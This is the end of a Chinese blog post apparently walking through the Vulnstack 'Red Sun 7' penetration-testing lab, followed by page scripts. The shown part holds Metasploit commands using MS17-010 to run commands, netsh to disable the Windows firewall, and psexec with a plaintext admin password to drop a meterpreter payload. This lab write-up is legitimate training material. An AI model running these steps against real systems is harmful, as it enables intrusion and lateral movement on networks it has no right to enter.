+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set rhosts 192.168.93.30</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set command whoami</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>system权限</p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231123134628605.png" alt="image-20231123134628605"></p>
+<p>查看防火墙状态(但是有乱码)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set command netsh advfirewall show allprofiles</span><br></pre></td></tr></table></figure>
+
+<p>关闭防火墙</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set command netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
+
+<h3 id="psexec横向获取system权限"><a href="#psexec横向获取system权限" class="headerlink" title="psexec横向获取system权限"></a>psexec横向获取system权限</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set rhosts 192.168.93.30</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set lport 4444</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set SMBUser administrator</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set SMBPass Whoami2021</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set payload windows/meterpreter/bind_tcp</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231123163725750.png" alt="image-20231123163725750"></p>
+<h2 id="注"><a href="#注" class="headerlink" title="注"></a>注</h2><p>192.168.93.40也是利用ms17-010获取权限，就不再赘述了</p>
+<p>靶场：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/9/">http://vulnstack.qiyuanxuetang.net/vuln/detail/9/</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://blog.ming9.top">ming</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://blog.ming9.top/2023/11/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/">http://blog.ming9.top/2023/11/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://blog.ming9.top" target="_blank">ming</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></div><div class="post_share"><div class="social-share" data-image="/img/red.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/12/06/pwn/" title="Xctf--pwnstack"><img class="cover" src="/img/dong.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Xctf--pwnstack</div></div></a></div><div class="next-post pull-right"><a href="/2023/11/11/%E4%B8%80%E6%AC%A1CTF%E9%80%86%E5%90%91%E9%A2%98%E7%9B%AE/" title="一次CTF逆向题目"><img class="cover" src="/img/picture.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">一次CTF逆向题目</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">ming</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/XiaoMMing9"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/XiaoMMing9" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://space.bilibili.com/1544982906" target="_blank" title="Bilibili"><i class="fa-brands fa-bilibili" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Welcome to My blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7"><span class="toc-number">1.</span> <span class="toc-text">红日靶场7</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.</span> <span class="toc-text">流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#192-168-1-4"><span class="toc-number">1.2.</span> <span class="toc-text">192.168.1.4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#goby%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.1.</span> <span class="toc-text">goby扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E5%86%99ssh%E5%85%AC%E9%92%A5%E5%B9%B6%E8%BF%9B%E8%A1%8Cssh%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.2.2.</span> <span class="toc-text">redis写ssh公钥并进行ssh连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%86192-168-1-4%E8%BF%9E%E4%B8%8ACs%E6%8E%A7"><span class="toc-number">1.2.3.</span> <span class="toc-text">将192.168.1.4连上Cs控</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%B6%E9%9B%86192-168-1-4%E7%9A%84%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF"><span class="toc-number">1.2.4.</span> <span class="toc-text">收集192.168.1.4的内网信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#192-168-52-20"><span class="toc-number">1.3.</span> <span class="toc-text">192.168.52.20</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2021-3129%E5%BE%97shell"><span class="toc-number">1.3.1.</span> <span class="toc-text">CVE-2021-3129得shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.2.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#docker%E9%80%83%E9%80%B8%E6%88%90root%E6%9D%83%E9%99%90"><span class="toc-number">1.3.3.</span> <span class="toc-text">docker逃逸成root权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%B6%E9%9B%86192-168-52-20%E7%9A%84%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF"><span class="toc-number">1.3.4.</span> <span class="toc-text">收集192.168.52.20的内网信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%86192-168-52-20%E8%BF%9E%E4%B8%8ACs%E6%8E%A7"><span class="toc-number">1.3.5.</span> <span class="toc-text">将192.168.52.20连上Cs控</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%B6%E9%9B%86%E7%BD%91%E6%AE%B5%E4%BF%A1%E6%81%AF"><span class="toc-number">1.3.6.</span> <span class="toc-text">收集网段信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fscan%E4%B8%80%E6%8A%8A%E5%97%A6"><span class="toc-number">1.3.7.</span> <span class="toc-text">fscan一把嗦</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ew%E4%BB%A3%E7%90%86"><span class="toc-number">1.3.8.</span> <span class="toc-text">ew代理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#192-168-93-20"><span class="toc-number">1.4.</span> <span class="toc-text">192.168.93.20</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BE%BEOA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.4.1.</span> <span class="toc-text">通达OA文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.4.2.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.4.3.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81"><span class="toc-number">1.4.4.</span> <span class="toc-text">抓取密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%90%AF%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E7%99%BB%E5%BD%95"><span class="toc-number">1.4.5.</span> <span class="toc-text">开启远程连接登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7"><span class="toc-number">1.4.6.</span> <span class="toc-text">创建用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mstsc"><span class="toc-number">1.4.7.</span> <span class="toc-text">mstsc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#192-168-93-30"><span class="toc-number">1.5.</span> <span class="toc-text">192.168.93.30</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ew%E4%BB%A3%E7%90%86-1"><span class="toc-number">1.5.1.</span> <span class="toc-text">ew代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E5%88%A9%E7%94%A817010%E8%BF%9B%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.5.2.</span> <span class="toc-text">msf利用17010进行命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#psexec%E6%A8%AA%E5%90%91%E8%8E%B7%E5%8F%96system%E6%9D%83%E9%99%90"><span class="toc-number">1.5.3.</span> <span class="toc-text">psexec横向获取system权限</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8"><span class="toc-number">1.6.</span> <span class="toc-text">注</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/12/06/%E7%BC%96%E5%86%99shellcode%E7%9A%84%E9%80%BB%E8%BE%91/" title="编写shellcode的逻辑"><img src="/img/jian.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="编写shellcode的逻辑"/></a><div class="content"><a class="title" href="/2023/12/06/%E7%BC%96%E5%86%99shellcode%E7%9A%84%E9%80%BB%E8%BE%91/" title="编写shellcode的逻辑">编写shellcode的逻辑</a><time datetime="2023-12-06T08:33:04.000Z" title="发表于 2023-12-06 16:33:04">2023-12-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/06/pwn/" title="Xctf--pwnstack"><img src="/img/dong.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Xctf--pwnstack"/></a><div class="content"><a class="title" href="/2023/12/06/pwn/" title="Xctf--pwnstack">Xctf--pwnstack</a><time datetime="2023-12-06T07:47:26.000Z" title="发表于 2023-12-06 15:47:26">2023-12-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/" title="红日靶场7"><img src="/img/red.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日靶场7"/></a><div class="content"><a class="title" href="/2023/11/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/" title="红日靶场7">红日靶场7</a><time datetime="2023-11-23T10:02:13.000Z" title="发表于 2023-11-23 18:02:13">2023-11-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/11/%E4%B8%80%E6%AC%A1CTF%E9%80%86%E5%90%91%E9%A2%98%E7%9B%AE/" title="一次CTF逆向题目"><img src="/img/picture.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="一次CTF逆向题目"/></a><div class="content"><a class="title" href="/2023/11/11/%E4%B8%80%E6%AC%A1CTF%E9%80%86%E5%90%91%E9%A2%98%E7%9B%AE/" title="一次CTF逆向题目">一次CTF逆向题目</a><time datetime="2023-11-11T01:17:09.000Z" title="发表于 2023-11-11 09:17:09">2023-11-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/06/%E6%A0%85%E6%A0%8F%E5%8A%A0%E5%AF%86%E5%85%8D%E6%9D%80%E6%9C%A8%E9%A9%AC/" title="栅栏加密免杀木马"><img src="/img/6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="栅栏加密免杀木马"/></a><div class="content"><a class="title" href="/2023/11/06/%E6%A0%85%E6%A0%8F%E5%8A%A0%E5%AF%86%E5%85%8D%E6%9D%80%E6%9C%A8%E9%A9%AC/" title="栅栏加密免杀木马">栅栏加密免杀木马</a><time datetime="2023-11-06T02:09:39.000Z" title="发表于 2023-11-06 10:09:39">2023-11-06</time></div></div></div></div></div></div></main><footer id="footer" style="background: url(/img/index1.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2023 By ming</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my blog !</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"></div><script src="/js/sakura.js"></script><div class="aplayer no-destroy" data-id="8853670988" data-server="netease" data-type="playlist" data-fixed="true" data-autoplay="true" > </div><script> function removelrc() {if (!document.querySelector(".aplayer-icon-lrc"))return; else{document.removeEventListener("DOMNodeInserted",removelrc);setTimeout(function() {document.querySelector(".aplayer-icon-lrc").click();}, 1);console.log("success");return;}}document.addEventListener('DOMNodeInserted', removelrc)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener
+  btf.removeGlobalFnEvent('pjax')
+  btf.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
